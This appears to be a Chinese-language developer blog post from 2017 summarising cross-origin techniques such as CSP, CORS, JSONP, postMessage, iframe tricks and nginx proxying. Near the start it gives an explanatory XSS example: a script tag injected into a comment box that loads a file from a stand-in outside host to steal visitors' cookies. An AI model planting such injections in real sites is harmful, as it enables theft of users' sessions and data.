---
title: Cross-origin Summarization
thumbnailImagePosition: right
date: 2017-06-12 11:12:51
thumbnailImage: nginx.jpg
coverImage:
tags:
- cross-origin
categories:
---
跨域问题总结。
<!--excerpt-->

跨域是一个时常出现在程序员工作当中的问题。前两天正好小组也对该主题进行了一番探讨，在此结合业内大牛的知识分享做一下个人的总结。

<!--toc-->

## XSS
[XSS(跨站脚本攻击)](https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet)就是很好地利用了script脚本可以跨域的特性来进行恶意攻击。
假如你的站点没有设立预防XSS漏洞的固定方法，那么很有可能存在XSS漏洞，XSS攻击经常发生在一些公共板块，比如留言板、评论区。
1. 比如恶意用户在网站留言区输入以下代码：
>`<script scr="www.xxx.com/xss.js"></script>`

2. 其他用户或管理员访问该页面的时候 `xss.js` 就会自动执行
3. 通过 `xss.js` 可以很方便地获取用户的cookies等敏感信息造成信息泄露。

## 协议层实现跨域

### CSP
[CSP(Content Security Policy)](https://content-security-policy.com/)通过http响应头来定义网页自身能够访问哪些域和哪些资源，可减少XSS的发生，*不过不支持全部浏览器是它的硬伤*。以script为例：
> `Content-Security-Policy: script-src 'self' https://example.com`

这么写表示浏览器只会加载并执行本域和`https://example.com`的脚本。同样的，还有`img-src`、`style-src`、`font-src`等等。

### CORS
[CORS(Cross Origin Resource Sharing)](https://en.wikipedia.org/wiki/Cross-origin_resource_sharing)跨域资源共享定义的是一个网页如何才能访问被同源策略禁止的跨域资源，规定了两者交互的协议和方式。*浏览器版本需要 IE >= 10*。
CORS请求分为简单请求和非简单请求，具体解释请移步[跨域资源共享 CORS 详解](http://www.ruanyifeng.com/blog/2016/04/cors.html)。
其最重要的是在请求头信息中增加`Origin`字段，服务器接收到请求之后判断该Origin是否在许可范围内，如果是则在响应头信息中添加`Access-Control-Allow-Origin`字段，允许跨域请求。
> JSONP只支持GET请求，CORS支持所有类型的HTTP请求。JSONP的优势在于支持老式浏览器，以及可以向不支持CORS的网站请求数据。
>                                        ---阮一峰的网络日志

### WebSocket
WebSocket是一种通信协议，使用ws://（非加密）和wss://（加密）作为协议前缀。该协议不实行同源政策，只要服务器支持，就可以通过它进行跨源通信。其原理同CORS，在请求头中添加`Origin`字段，服务器可根据这个字段来判断该域名是否在白名单内，做出不同的请求响应。

## 小技巧方法实现跨域

### jsonp
jsonp充分利用了页面上script标签src引用可以跨域的特性，通过返回一个可执行的js文件达到跨域请求的目的。
如果页面引用了jquery，则可以很方便地使用它封装的方法来进行jsonp操作：
```
<script>
	$.getJSON('http://example.com/data.php?callback=?',function(jsonData){
		//do something
	});
</script>
```
jquery会自动生成一个全局函数来替换`callback=?`中的问号，实际上就是起一个临时代理函数的作用。$.getJSON方法会自动判断是否跨域，不跨域的话就调用普通的ajax方法；跨域的话则会以异步加载js文件的形式来调用jsonp的回调函数。

### 片段识别符
片段标识符（fragment identifier）指的是，URL的#号后面的部分，比如`http://example.com/x.html#fragment`的`#fragment`。如果只是改变片段标识符，页面不会重新刷新。
1. 父窗口可以通过把信息写入子窗口的片段标识符来达到传递信息的目的。
```
var src = originURL + '#' + data;
document.getElementById('iframe').src = src;
```
2. 子窗口通过监听hashchange事件得到通知。
```
window.onhashchange = checkMessage;
function checkMessage() {
  var message = window.location.hash;
  // do something
}
```

### window.domain
修改document.domain的方法只适用于*同主域不同子域*的框架间的交互，也可以共享cookies，不适用于通过ajax的方法与不同子域的页面交互。只能把document.domain设置成自身或更高一级的父域，且主域必须相同。
比如两个都在`example.com`主域下的页面`a.example.com/a.html`和嵌入在`a.html`的iframe中的`b.example.com/b.html`需要相互通信，直接在`a.html`中使用`document.getElementById('iframe').contentWindow`虽然可以获取到iframe里面的window对象，但是该window对象的属性和方法几乎是不可用的。
需要同时在两个页面指定`document.domain`，即`document.domain = 'example.com'`，这样就能在`a.html`页面获取到`b.html`页面的属性和方法。

### window.name
浏览器窗口有window.name属性。这个属性的最大特点是，*无论是否同源*，只要在同一个窗口里，前一个网页设置了这个属性，后一个网页可以读取它。例如，`www.example1.com/a.html`需要获取`www.example2.com/b.html`中的`data`，可以这么做：
1. 在`a.html`中创建一个隐藏的iframe，src指向`b.html`；
2. `b.html`通过js设置`window.name = data`；
3. 设置iframe的src指向一个和`a.html`同域的页面`www.example1.com/c.html`
4. `a.html`可以访问同域的ifram页面`c.html`，获取里面的`data`。

### window.postMessage
HTML5为了解决跨域问题，引入了一个全新的API：跨文档通信 API(Cross-document messaging)。*浏览器支持 IE >= 8*。方法为`window.postMessage(message,targetOrigin)`，调用postMessage方法的window对象是指要接收消息的那一个window对象，该方法的第一个参数message为要发送的消息，类型只能为字符串；第二个参数targetOrigin用来限定接收消息的那个window对象所在的域，如果不想限定域，可以使用通配符 *  。
比如`www.example1.com/a.html`要向它的内部的iframe子页面`www.example2.com/b.html`发送消息，则可以这样来做：
1. 在`a.html`页面可以这样发送消息：
```
<script>
function onload(){
	var iframe = document.getElementById('iframe');
	var win = iframe.contentWindow;//获取目标window对象
	win.postMessage('你好！','*');//向目标window发送消息
}
</script>
<iframe id="iframe" src="http://www.example2.com/b.html" onload="onload()"></iframe>
```
2. 在`b.html`页面可以这样接收消息：
```
<script>
window.onmessage = function(e){
	e = e || event;
	alert(e.source);//发送消息的窗口
	alert(e.origin);//消息发向的网址
	alert(e.data);//消息内容
}
</script>
```

### 利用iframe实现跨域
假如www.domainA.com/a.html下有个iframe标签，src指向www.domainB.com/b.html,因为a.html和b.html不在同一个域，所以a.html无法直接调用b.html页面的方法，此时可以在调用方法的时候动态创建一个和b.html在同一个域的页面executB.html，利用executB.html加载的时候执行executB.html页面的方法来间接调用b.html的方法。举个栗子：
```
http://localhost:8081/a.html:
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>A</title>
</head>
<body>
    <button onclick="executB();">执行B页面方法</button>
    <iframe name="biframe" src="http://localhost:8082/b.html"></iframe>
</body>
<script>
    function main(){
        alert('msg from A');
    }

    var executobj;
    function executB(){
        if(typeof executobj == 'undefined'){
            executobj = document.createElement('iframe');
            executobj.src = 'http://localhost:8082/executB.html';
            executobj.style.display = 'none';
            document.body.appendChild(executobj);
        }else{
            executobj.src = 'http://localhost:8082/executB.html?'+Math.random();
        }
    }
</script>
</html>
```
```
http://localhost:8082/b.html:
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>B</title>
    <style>
        body{
            background-color: aqua;
        }
    </style>
</head>
<body>
</body>
<script>
    function main(){
        alert('msg from B');
    }
</script>
</html>
```
```
http://localhost:8082/executB.html:
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>executB</title>
</head>
<body>
</body>
<script>
    parent.window.biframe.main();
</script>
</html>
```

## nginx反向代理实现跨域
这种方法不需要目标服务器的配合，只需要搭建一台中转nginx服务器，用于转发请求。由页面请求一个本域的地址，转由nginx代理处理之后转发获取请求结果返回给页面。
![nginx反向代理示意图](nginx.jpg)


## 参考资料

[阮一峰的网络日志](http://www.ruanyifeng.com/blog/2016/04/same-origin-policy.html)
[Jerry Qu's Blog](https://imququ.com/post/content-security-policy-reference.html)
[无双的Bolg](http://www.cnblogs.com/2050/p/3191744.html)
